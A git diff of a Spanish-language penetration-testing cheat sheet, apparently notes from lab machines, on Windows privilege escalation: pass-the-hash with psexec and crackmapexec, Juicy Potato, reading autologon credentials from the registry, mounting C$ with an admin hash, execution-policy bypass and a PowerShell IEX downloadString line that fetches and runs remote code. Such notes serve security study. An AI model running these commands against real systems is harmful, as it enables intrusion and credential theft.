@@ -1712,14 +1712,14 @@ Igual permite regresar una shell con permisos de authority system. Pasos previos
 psexec.py WORKGROUP/s4vitar@10.10.14.22 cmd.exe
 Password:
 ```
-## PSEXEC Pass the Hash
+### PSEXEC Pass the Hash
 Pero tambien se puede hacer pasando el hash
 
 ```
 crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
 ```
 
-## Windows exploit suggester Next generation
+### Windows exploit suggester Next generation
 
 WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.
 
@@ -1728,7 +1728,7 @@ WES-NG is a tool based on the output of Windows' systeminfo utility which provid
 Tiene la capacidad de con el output del systeminfo genera las vulns pero da muchos falsos positivos.
 
 
-## Juicy Potato
+### Juicy Potato
 
 Esta es una herramienta donde puedes escalar privilegios si esta el SetImpersonate privilege activado. En la maquina Jeeves me funciono sin el CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) sin embargo, en las otras si tuve que ponerlo.
 
@@ -1745,7 +1745,7 @@ En el contexto de Windows, el CLSID (Class ID o Identificador de Clase) es un id
 > https://github.com/ohpe/juicy-potato
 
 
-## Ver credenciales de windows Winlogon (for autologon)
+### Ver credenciales de windows Winlogon (for autologon)
 
 
 NOta en la maquina bart usa esto 0xd pero se tiene que ejecutar en un proceso de 64 bits siempre intenta ejecutar una shell con ese procesos de x64
@@ -1758,7 +1758,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | f
 ```
 
 
-## Montar un recurso con windows
+### Montar un recurso con windows
 
 Si tienes las contraseñas de un usuario administrador o el admin puedes montar el disco c con todos los privilegios...
 
@@ -1766,7 +1766,7 @@ Si tienes las contraseñas de un usuario administrador o el admin puedes montar 
  net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
 ```
 
-## Powershell Execution Policy Bypass
+### Powershell Execution Policy Bypass
 
 Para brincarse la execution policy se hace asi
 
@@ -1776,7 +1776,7 @@ Para brincarse la execution policy se hace asi
 ```
 
 
-## Debuggear scritps Powershell
+### Debuggear scritps Powershell
 
 Para debuggear scripts usa "Wait-Debugger". cuando estes dentro usa h para ver como ir paso a paso.
 
@@ -1802,7 +1802,7 @@ La s entra dentro de las funciones y si quieres ver donde va usa l ademas si qui
 
 ![image](https://github.com/gecr07/Acordeon/assets/63270579/ebcf1685-8ee9-462e-bb72-62e1d9ac177e)
 
-## Powershell codigo de estado $?
+### Powershell codigo de estado $?
 
 ![image](https://github.com/gecr07/Acordeon/assets/63270579/585128cf-4a8d-433f-a2e2-bfe7e9077fde)
 
@@ -1824,12 +1824,8 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 ```
 
-## Net use Montar un file system
-
-Supongo que se puede hacer remoto o local hay que probarlo.
-
-```
-net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
-```
 
 
+# Active Directory
+
+## 
